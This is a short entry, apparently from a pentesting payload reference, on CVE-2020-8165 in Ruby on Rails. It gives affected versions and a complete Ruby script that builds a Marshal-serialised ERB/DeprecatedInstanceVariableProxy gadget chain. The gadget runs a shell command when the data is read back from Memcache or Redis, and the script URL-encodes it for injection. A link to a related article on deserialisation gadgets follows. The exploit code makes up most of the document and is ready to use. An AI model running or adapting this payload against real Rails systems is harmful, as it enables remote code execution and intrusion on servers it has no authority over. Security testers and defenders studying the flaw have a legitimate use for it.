# Ruby

### CVE-2020-8165

Exploitable in Rails &lt; 5.2.4.3, Rails &lt; 6.0.3.1 \(install with `apt install ruby-railties`\)  when Memcache/Redis is used with raw: true. Let the following payload generate the data, then use it on a field that is going to Memcache/Redis:

```ruby
require 'erb'
require 'rails/all'

remote_code = <<-RUBY
`whoami`
RUBY

erb = ERB.allocate
erb.instance_variable_set(:@src, remote_code)
erb.instance_variable_set(:@lineno, 0)
deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
exploit_data = Marshal.dump(deprecation)
puts URI.encode_www_form(payload: exploit_data)
```

### Interesting Reads

* [https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

